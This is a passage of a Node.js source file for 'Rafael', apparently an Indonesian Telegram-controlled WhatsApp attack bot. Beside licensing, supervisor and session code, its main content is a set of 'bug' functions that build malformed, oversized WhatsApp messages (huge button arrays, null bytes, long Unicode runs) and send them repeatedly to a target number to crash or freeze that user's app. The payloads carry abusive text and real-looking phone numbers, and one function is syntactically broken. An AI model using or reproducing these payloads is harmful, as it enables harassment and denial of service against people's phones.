      if (!String(err.message).includes("HTTP_")) {
        console.log(chalk.gray(`[UPDATE-CHECK] ${err.message}`));
      }
      isUpdating = false;
      return false;
    }
  }

  checkOnce(true).then((updated) => {
    if (updated) return;
    setInterval(() => checkOnce(false), CHECK_INTERVAL);
    console.log(chalk.cyan.bold(`[UPDATE] Auto-update checker aktif (2 jam).`));
  });
}

// ============================================================
// SUPERVISOR
// ============================================================
function runSupervisor() {
  const { spawn } = require("child_process");
  let restartCount = 0;
  let lastStart = Date.now();

  function spawnBot() {
    restartCount++;
    lastStart = Date.now();
    console.log(chalk.cyan.bold(`\n[SUPERVISOR] Menjalankan bot (start ke-${restartCount})...`));

    const child = spawn(process.execPath, [__filename], {
      stdio: "inherit",
      env: { ...process.env, RAFAEL_CHILD: "1" },
      cwd: __dirname,
    });

    child.on("exit", (code, signal) => {
      const uptime = ((Date.now() - lastStart) / 1000).toFixed(1);
      console.log(chalk.yellow.bold(
        `\n[SUPERVISOR] Bot berhenti. Code=${code} Signal=${signal} Uptime=${uptime}s`
      ));

      const isUpdateRestart = signal === 'SIGTERM' || code === 42;
      const delay = isUpdateRestart ? 2000 : (uptime < 10 ? 10000 : 3000);
      console.log(chalk.cyan.bold(`[SUPERVISOR] Restart dalam ${delay / 1000}s...\n`));

      setTimeout(spawnBot, delay);
    });

    child.on("error", (err) => {
      console.error(chalk.red(`[SUPERVISOR] Gagal spawn: ${err.message}`));
      setTimeout(spawnBot, 5000);
    });
  }

  spawnBot();

  process.on("SIGINT", () => {
    console.log(chalk.red("\n[SUPERVISOR] Menerima SIGINT. Keluar..."));
    process.exit(0);
  });
  process.on("SIGTERM", () => {
    console.log(chalk.red("\n[SUPERVISOR] Menerima SIGTERM. Keluar..."));
    process.exit(0);
  });
}

// ============================================================
// [PROTECTION]
// ============================================================
function enableBypassProtection() {
  console.log("\x1b[41m\x1b[37m[🔐 PROTECTION]\x1b[0m BY BRONSEW ACTIVE 🔥\n");
}

// ============================================================
// TOKEN VALIDATION
// ============================================================
const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/cistiansaputraa-alt/yandayy/main/token.json";

bot.telegram.setMyCommands([
  { command: 'start', description: 'Developer @bronsew' },
  { command: 'antipromo', description: 'Toggle anti promosi per group' },
  { command: 'privatemute', description: 'Toggle auto mute private chat' },
]).then(() => {
  console.log('Daftar perintah berhasil diperbarui!');
}).catch((error) => {
  console.error('Gagal memperbarui perintah:', error.message);
});

// ============================================================
// HANDLER: BOT MASUK GROUP
// ============================================================
bot.on("my_chat_member", async (ctx) => {
  try {
    const update = ctx.update.my_chat_member;
    const newStatus = update.new_chat_member.status;
    const oldStatus = update.old_chat_member.status;
    const chat = update.chat;

    const isGroup = chat.type === "group" || chat.type === "supergroup";
    if (!isGroup) return;

    const chatId = String(chat.id);
    const chatTitle = chat.title || "Tanpa Nama";

    const joinedStatuses = ["member", "administrator"];
    const oldLeftStatuses = ["left", "kicked"];

    if (joinedStatuses.includes(newStatus) && oldLeftStatuses.includes(oldStatus)) {
      if (isGroupApproved(chatId)) return;

      await ctx.telegram.sendMessage(
        chat.id,
        "⚠️ Bot masuk ke group ini tapi belum di-approve owner.\n\nJika dalam 10 menit tidak di-approve, bot akan keluar otomatis."
      );

      await ctx.telegram.sendMessage(
        ownerID,
        `🚨 BOT DITAMBAHKAN KE GROUP BARU\n\n` +
        `Nama Group: ${chatTitle}\n` +
        `Chat ID: ${chatId}\n\n` +
        `Gunakan:\n` +
        `/approved ${chatId}\n\n` +
        `Jika ingin mengizinkan bot aktif di group tersebut.`
      );

      if (pendingGroups.has(chatId)) {
        clearTimeout(pendingGroups.get(chatId).timeout);
      }

      const timeout = setTimeout(async () => {
        try {
          if (!isGroupApproved(chatId)) {
            await ctx.telegram.sendMessage(
              chat.id,
              "❌ Group tidak di-approve dalam 10 menit. Bot keluar otomatis."
            );
            await ctx.telegram.leaveChat(chat.id);
          }
        } catch (e) {
          console.error("Gagal leave group:", e.message);
        } finally {
          pendingGroups.delete(chatId);
        }
      }, 10 * 60 * 1000);

      pendingGroups.set(chatId, {
        title: chatTitle,
        timeout
      });
    }
  } catch (err) {
    console.error("Error my_chat_member:", err.message);
  }
});

// ============================================================
// TOKEN FETCH
// ============================================================
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!Array.isArray(validTokens) || !validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(` JANGAN LUPA MASUK CH INFO SCRIPT⠀⠀`));
}

function printBanner() {
  console.clear();
  console.log(chalk.white(`
⠀⠀⣿⣦⡀⠀⠀⠀⠀⢀⡄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⡿⠻⢶⣤⣶⣾⣿⠁⠀⢽⣆⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣽⠉⠀⠀⠀⣠⣿⠃⠀⠀⢀⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣿⣀⣀⠀⠀⠈⠉⢻⣦⡀⠚⠻⠿⣿⣿⠿⠛⠂⠀⠀⢀⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⣇⠀⣾⣿⣿⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣷⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⣿⢿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣾⠀⠀⠀⠩⣿⣿⠿⠿⠿⡿⠋⠀⠘⣿⣿⡆⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣅⠀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣮⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣤⣽⣿⣿⠟⠋
⠀⠀⠀⠀⠀⣴⠿⠛⠻⢿⣿⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣿⣿⣿⣿⣷⣄⢀⣿⣿⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀
`));
  console.log(chalk.cyan(`
╔─═⊱ Information:
☇ Creator : @bronsew
☇ Name Script : Rafael
☇ Version : infinity 
┗━━━━━━━━━━━━━━━━━━━━━━⬡
`));
  console.log(chalk.blue(" RAFAEL IS HERE...!"));
  console.log(chalk.magenta("🔐 ALL LOCK."));
}

async function checkExpired() {
  const EXPIRED = new Date("3010-05-15T07:25:00Z").getTime();
  try {
    const res = await axios.get("https://google.com");
    const now = new Date(res.headers.date).getTime();
    const diff = EXPIRED - now;

    if (diff <= 0) {
      console.log("❌ SCRIPT EXPIRED, MOHON UNTUK MENUNGGU UPDATE DARI @bronsew");
      process.exit(0);
    }

    const hari = Math.floor(diff / 86400000);
    const jam = Math.floor((diff % 86400000) / 3600000);
    console.log(`✅ SCRIPT AKTIF | WAKTU TERSISA | ${hari} HARI ${jam} JAM LAGI`);
  } catch {
    console.log("⚠️ Gagal cek waktu internet");
  }
}

// ============================================================
// STORE
// ============================================================
const store = {
  messages: {},
  contacts: {},
  chats: {},
  bind(ev) {
    ev.on('messages.upsert', ({ messages }) => {
      for (const msg of messages) {
        if (!msg.key?.remoteJid) continue;
        const jid = msg.key.remoteJid;
        if (!store.messages[jid]) store.messages[jid] = [];
        store.messages[jid].push(msg);
        if (store.messages[jid].length > 200) store.messages[jid].shift();
      }
    });
    ev.on('contacts.upsert', (contacts) => {
      for (const c of contacts) store.contacts[c.id] = c;
    });
    ev.on('chats.upsert', (chats) => {
      for (const c of chats) store.chats[c.id] = c;
    });
  },
  loadMessage(jid, id) {
    return (store.messages[jid] || []).find(m => m.key.id === id);
  },
};

// ============================================================
// CLEANUP SESSION
// ============================================================
async function cleanupSessionAndRestart() {
  isWhatsAppConnected = false;
  isReconnecting = false;

  try { sock?.ev?.removeAllListeners?.(); } catch {}
  try { sock?.ws?.close?.(); } catch {}
  try { sock?.end?.(undefined); } catch {}
  sock = null;

  await new Promise(r => setTimeout(r, 2000));

  const sessionDir = path.resolve('./session');
  for (let i = 0; i < 5; i++) {
    try {
      if (fs.existsSync(sessionDir)) {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      }
      if (!fs.existsSync(sessionDir)) {
        console.log(chalk.green.bold('[✓] Folder session berhasil dihapus.'));
        console.log(chalk.cyan.bold('[i] Memulai ulang bot dalam 5 detik untuk pairing baru...'));
        setTimeout(() => {
          startSesi().catch(err =>
            console.log(chalk.red(`[RESTART] Gagal start ulang: ${err.message}`))
          );
        }, 5000);
        return;
      }
    } catch (err) {
      console.log(chalk.yellow(`[CLEANUP] Percobaan ${i + 1} gagal: ${err.message}`));
    }
    await new Promise(r => setTimeout(r, 1000));
  }
  console.log(chalk.red.bold('[✗] Gagal hapus folder session. Hapus manual di:'));
  console.log(chalk.yellow(`    ${sessionDir}`));
}

// ============================================================
// START SESI
// ============================================================
const startSesi = async () => {
  if (sock) {
    try { sock.ev.removeAllListeners(); } catch {}
    try { sock.ws?.close(); } catch {}
    try { sock.end?.(undefined); } catch {}
    sock = null;
  }

  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: Browsers.macOS('Safari'),
    syncFullHistory: false,
    markOnlineOnConnect: false,
  };

  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('messages.upsert', () => { lastActivity = Date.now(); });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      isReconnecting = false;
      isWhatsAppConnected = true;
      lastActivity = Date.now();

      console.log(chalk.green.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Berhasil Tersambung')}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      isWhatsAppConnected = false;

      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const reason = lastDisconnect?.error?.message || 'unknown';
      const reasonLower = String(reason).toLowerCase();

      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Terputus')}
╰─────────────────────────────╯
  Status : ${statusCode ?? '-'}
  Reason : ${reason}
`));

      const isConflict =
        reasonLower.includes('conflict') ||
        reasonLower.includes('replaced') ||
        reasonLower.includes('stream errored');

      const isRealLogout =
        statusCode === DisconnectReason.loggedOut && !isConflict;

      const isSessionBad =
        statusCode === 500 ||
        statusCode === 411;

      const isForbidden = statusCode === 403;

      if (isRealLogout || isSessionBad || isForbidden) {
        console.log(chalk.red.bold(
          '[!] Sesi benar-benar mati / logout. Menghapus folder session...'
        ));
        await cleanupSessionAndRestart();
        return;
      }

      if (isReconnecting) return;
      isReconnecting = true;

      try { sock?.ev?.removeAllListeners?.(); } catch {}
      try { sock?.ws?.close?.(); } catch {}
      try { sock?.end?.(undefined); } catch {}
      sock = null;

      const delayMs = 5000;
      console.log(chalk.yellow.bold(`
╭─────────────────────────────╮
│ ${chalk.white(`Menyambung kembali dalam ${delayMs / 1000}s...`)}
╰─────────────────────────────╯`));

      setTimeout(async () => {
        try {
          await startSesi();
        } catch (err) {
          console.log(chalk.red(`[RECONNECT] Gagal start sesi: ${err.message}`));
          isReconnecting = false;
        }
      }, delayMs);
    }
  });
};

// ============================================================
// MIDDLEWARE WHATSAPP CONNECTION
// ============================================================
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected || !sock || !sock.user) {
    ctx.reply(`❌ WhatsApp Belum terhubung`);
    return;
  }
  if (typeof sendQueue !== 'undefined' && sendQueue.users >= RR_CONFIG.MAX_CONCURRENT_USERS) {
    ctx.reply(
      `⏳ *Server sedang sibuk*\n\n` +
      `👥 User dalam antrian: *${sendQueue.users}/${RR_CONFIG.MAX_CONCURRENT_USERS}*\n` +
      `📦 Total task: *${sendQueue.length}*\n\n` +
      `Ketik /queue untuk lihat antrian.`,
      { parse_mode: 'Markdown' }
    );
    return;
  }
  next();
};

// ============================================================
// BOT MIDDLEWARE
// ============================================================
bot.use(session());
bot.use(checkRestMode);

// ============================================================
// FUNGSI BUG
// ============================================================
async function BebasSpam(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 1000;
  const totalLoops = 5;
  const startTime = Date.now();
  const nomor = target.split('@')[0];

  console.log(`[Task ${taskId}] Mulai spam ke ${nomor}`);

  for (let i = 1; i <= totalLoops; i++) {
    const loopStart = Date.now();
    try {
      await GrenXx(sock, target);
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`[${i}/${totalLoops}] Terkirim → ${nomor} (${duration}s)`);
    } catch (err) {
      console.error(`[${i}/${totalLoops}] Gagal → ${nomor}:`, err.message);
    }
    if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai → ${nomor} dalam ${totalTime}s`);
}

async function BebasSpam2(sock, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 1000;
  const totalLoops = 5;
  const startTime = Date.now();
  const nomor = target.split('@')[0];

  console.log(`[Task ${taskId}] Mulai spam ke ${nomor}`);

  for (let i = 1; i <= totalLoops; i++) {
    const loopStart = Date.now();
    try {
      await ortulukemana(sock, target);
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`[${i}/${totalLoops}] Terkirim → ${nomor} (${duration}s)`);
    } catch (err) {
      console.error(`[${i}/${totalLoops}] Gagal → ${nomor}:`, err.message);
    }
    if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
  }
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`[Task ${taskId}] Selesai → ${nomor} dalam ${totalTime}s`);
}

// ============================================================
// FUNGSI BUG PRIMITIF
// ============================================================
async function mbutnew(sock, target) {
    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "Rexzy" },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 9000 }, () => ({}))
                    },
                },
                quotedMessage: {
                    contactsArrayMessage: {
                        displayName: "\u20D3\u20D3".repeat(9999),
                        contacts: Array.from({ length: 35000 }, (_, n) => ({
                            displayName: "\u20D3Maklu" + (n + 1),
                            vcard: "BEGIN:VCARD\n" +
                                "VERSION:3.0\n" +
                                "FN:XRyyModeIpong" + (n + 1) + "\n" +
                                "TEL;type=CELL;type=VOICE;waid=6281248620184" + n + ":+62 812-4862-0284" + n + "\n" +
                                "END:VCARD"
                        }))
                    }
                },
            },
        },
    };
    await sock.relayMessage(target, msg1, {});
}

async function iosdelay(tvive, target) {
  const floods = 5;

  let message = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "</aether sange kontol",
            format: "DEFAULT",
            ephemeralExpiration: 0,
            forwardingScore: 999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
              "#" +
              Math.floor(Math.random() * 16777215)
                .toString(16)
                .padStart(6, "0")
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(40000),
            version: 3,
            entryPointConversionSource: "call_permission_message"
          }
        }
      }
    }
  };

  const msg = await generateWAMessageFromContent(target, message, {
    userJid: sock.user.id 
  });

  await tvive.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
  
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  await sock.relayMessage(target, {
    contactsArrayMessage: {
      displayName: "‼️⃟ ༚ tolol lu yatim" + "𑇂𑆵𑆴𑆿".repeat(60000),
      contacts: [
        {
          displayName: "‼️⃟ ༚ tolol lu yatim",
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;aether ganteng;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        },
        {
          displayName: "‼️⃟ ༚ tolol lu yatim",
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;aether ganteng;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5512988103218:+55 12 98810-3218\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        }
      ],
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        mentionedJid: mentionedJids, 
        quotedAd: {
          advertiserName: "x",
          mediaType: "IMAGE",
          jpegThumbnail: null,
          caption: "x"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }        
      }
    }
  }, { participant: { jid: target } });
}

async function makluInvis(sock, target) {
  for (let loop = 0; loop < 5; loop++) {
    const maklu = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "\u0000".repeat(50000) },
            nativeFlowMessage: {
              buttons: Array.from({ length: 300000 }, () => ({})),
              name: "crash_" + loop,
              buttonpramsjson: JSON.stringify({
                flow_action: "navigate",
                flow_cta: "X".repeat(15000)
              })
            }
          }
        }
      }
    };

    const memek2 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "A".repeat(70000) + "\u200b".repeat(70000)
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 400000 }, () => ({})),
              name: "mega_crash_" + loop,
              buttonpramsjson: JSON.stringify({
                flow_action: "navigate",
                flow_cta: "꧀".repeat(20000)
              })
            }
          }
        }
      }
    };

    const maklu3 = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: "\u0006".repeat(60000) },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({})),
              name: "ultra_crash_" + loop,
              buttonpramsjson: JSON.stringify({
                flow_action: "navigate",
                flow_cta: "ꦾ".repeat(25000)
              })
            }
          }
        }
      }
    };

    const memek3 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "B".repeat(80000) + "\u200b".repeat(80000)
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 600000 }, () => ({})),
              name: "god_crash_" + loop,
              buttonpramsjson: JSON.stringify({
                flow_action: "navigate",
                flow_cta: "\uFFFF".repeat(30000)
              })
            }
          }
        }
      }
    };

    await sock.relayMessage(target, maklu, {});
    await sock.relayMessage(target, memek2, {});
    await sock.relayMessage(target, maklu3, {});
    await sock.relayMessage(target, memek3, {});
  }
}

async function delayhard(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          title: "\u0000",
          body: { text: "\uFFFF" },
          nativeFlowMessage: {
            buttons: "\t".repeat(500000)
          }
        }
      },
      participant: target
    }
  };
  await sock.relayMessage(target, msg, {});
}

async function xovaliaum(sock, target) {
  for (let i = 0; i < 2; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: { text: " fvck xakaoffcial. " },
            nativeFlowMessage: {
              buttons: "\n".repeat(300000)
            }
          }
        }
      }
    }, { participant: true });
    await sleep(1500);
  }
}

async function AstecKiyuru(sock, target) {
    for (let x = 0; x < 5; x++) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: true,
                            imageMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "z8tbfc1DBcy9J0Gq7eJiu3ckMOyKKvbOs4Xl3J6UvGQ=",
                                fileLength: "1",
                                height: -212,
                                width: 999999999999,
                                mediaKey: "EiO5AfHhX1dTXqbBP5Wf/MzZ6qOqOG4nts9VrPv/rxY=",
                                fileEncSha256: "/PuWsqa9/5jDcRhuBexUEGjFN0wPHdXQPe/+SlSiwBU=",
                                directPath: "/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1778501051",
                                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAC8ASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABQIEBgEDAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABK0eKC9dyvDbCK+XhXZLYAcKosWaaBnLjFQVnGYcGrF4MKdzwIz8+nusagjXa2Jgx2H//EACcQAAICAgEDBAEFAAAAAAAAAAECAAMEERIFITEQExQgYSMyM0JR/9oACAEBAAE/AKLrFJPMynqFo8PKeqKR+pKsym3Wj9rem4tn9ADLujWps1NHD1rwdSCIDYSrpZxI8TH6haHSqzXKZGQ9YBXR3DdeD/IAZi3WWg8016tvideYUys3mjoAAezRum5SPEV0yC1ikHwJe9g/brUbOIdNrvRleUt4rNba03j0I2CJUxDsu+RWPchYAE/kCOeDoS25npz9rivcmZPvV8hxmwd78zBevHTuImWgQOXHGHwZ2cDiQCT3InAVAfnyYtVSncZQwjYd3MtsNL+m/I1pAhmTiXUaD+P9mSxGk36fHr2ddocYEd3YxMcaBbZP0dFcEMARM/pHLb0z/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwB//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwB//9k=",
                                scansSidecar: "xt906ajMmv0EvBy89zTBKFs9rvAOwr8mIqV2kxGG6xUVyUSGmWzpuw=",
                                scanLengths: [
                                    999999999999,
                                    999999999999,
                                    999999999999,
                                    999999999999
                                ],
                                midQualityFileSha256: ""
                            }
                        },
                        body: {
                            text: "KIYURUX.exe"
                        },
                        contextInfo: {
                            remoteJid: "undefined@s.whatsapp.net",
                            mentionedJid: ["undefined@s.whatsapp.net"],
                            isForwarded: true,
                            forwardingScore: 9999,
                            parentGroupJid: "0@g.us"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        }, {
            isSecret: true
        });
    }
}

async function ObxDelayIosOrAndroid(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\x10" + "𑇂𑆵𑆴𑆿".repeat(20000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const msg2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𑇂𑆵𑆴𑆿".repeat(20000)
                    },
                    nativeFlowMessage: {
                        buttons: "ြ".repeat(600000)
                    }
                }
            }
        }
    };

    const msg3 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𑇂𑆵𑆴𑆿".repeat(20000)
                    },
                    nativeFlowMessage: {
                        buttons: "one_crash_message".repeat(20000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg3, {});
}

async function tryingXsp(sock, target) {
  try {
    const x = "ꦽ".repeat(30000);
    const mentioned = new Array(50000);
    for (let i = 0; i < 50000; i++) {
      mentioned[i] = i + "@lid";
    }

    const msg = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: { title: x, hasMediaAttachment: false },
            body: { text: x, display_text: "\uFFFF" },
            contextInfo: {
              userJid: target,
              mentionedJid: mentioned,
              isGroupStatus: true,
              isForwarded: true
            }
          }
        }
      }
    };

    await sock.relayMessage(target, msg, {
      messageId: "3EB0" + Math.random().toString(36).substring(2, 18).toUpperCase()
    });
  } catch (e) {
    console.error("tryingXsp error:", e);
  }
}

async function syncdly(sock, target) {
  const x9k = {
    groupStatusMessageV2: {
      message: {
         interactiveMessage: {
          body: {
            text: "X9K"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({})),
            name: "galaxy_message",
            buttons: "\0" + ("\x10").repeat(345000)
          },
          contextInfo: {
            statusAttributionType: 999,
            quotedMessage: {
              stickerPackMessage: {},
               url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
               fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
               fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
               mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
               mimetype: "image/webp",
               directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
               fileLength: "10610",
               mediaKeyTimestamp: "1775044724",
               stickerSentTs: "1775044724091",
               name: "ꦾ".repeat(70000),
               publisher: "X9K - imposible" + "ꦾ".repeat(5000),
            } 
          }
        }
      }
    }
  };
  await sock.relayMessage(target, x9k, {});
  extendedextMessage: {
    message: {
    text: "\0";
    contextInfo: {
      mentionedJid: Array.from({    length: 2000 }, () =>
    Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
                );
    }
    }
  };
  participant:true
}

async function GrenXx(sock, target) {
  const OPTS = {};

  const Gren = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "GrenXHarimau" + "\0".repeat(20000)
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            quotedMessage: {
              richResponseMessage: {}
            }
          }
        }
      }
    }
  };

  try {
    await sock.relayMessage('status@broadcast', Gren, {
      ...OPTS,
      messageId: 'gx-' + Date.now().toString(36).toUpperCase(),
      statusJidList: [target],
      noSelfSync: true,
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{ tag: 'to', attrs: { jid: target }, content: [] }]
        }]
      }]
    });

    await sock.relayMessage('status@broadcast', {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              title: "\u0070".repeat(50000),
              subtitle: "\x10".repeat(50000),
              bloksWidget: {
                uuid: "\u200B".repeat(50000),
                data: "[".repeat(50001),
                render: "[".repeat(20000),
                type: "\u200F".repeat(50000),
                fallback: "\u200D".repeat(50000)
              }
            },
            body: { text: "" },
            nativeFlowMessage: {
              buttons: "[[[[[[".repeat(50000)
            }
          }
        }
      }
    }, {
      messageId: 'gx2-' + Date.now().toString(36).toUpperCase(),
